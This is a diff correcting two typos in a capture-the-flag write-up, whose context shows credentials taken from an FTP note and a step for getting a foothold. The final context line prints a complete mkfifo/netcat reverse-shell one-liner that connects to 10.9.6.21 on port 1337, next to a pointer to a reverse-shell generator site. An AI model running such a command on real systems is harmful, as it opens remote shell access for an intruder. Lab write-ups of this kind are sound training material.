@@ -108,7 +108,7 @@ local: note.txt remote: note.txt
 ftp> 
 ```
 
-Reading the note, we get a new port, and the username:passord to login!
+Reading the note, we get a new port, and the username:password to login!
 
 ## Foothold - Flag 1
 
@@ -141,7 +141,7 @@ drwxr-xr-x  2    0    0 4096 Apr  2 20:56 opt
 drwxr-xr-x  2    0    0 4096 Apr  3 01:35 tmp
 drwxr-xr-x  4    0    0 4096 Apr  2 22:43 usr
 ```
-We now have to get a reverse shell, I usde the mkfifo shell, you can use other one!
+We now have to get a reverse shell, I used the mkfifo shell, you can use other one!
 I recommend you to use [revshells.com](https://revshells.com) to generate the commands for reverse shells. It's created and mantained by the CTF's community!
 
 `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.6.21 1337 >/tmp/f`
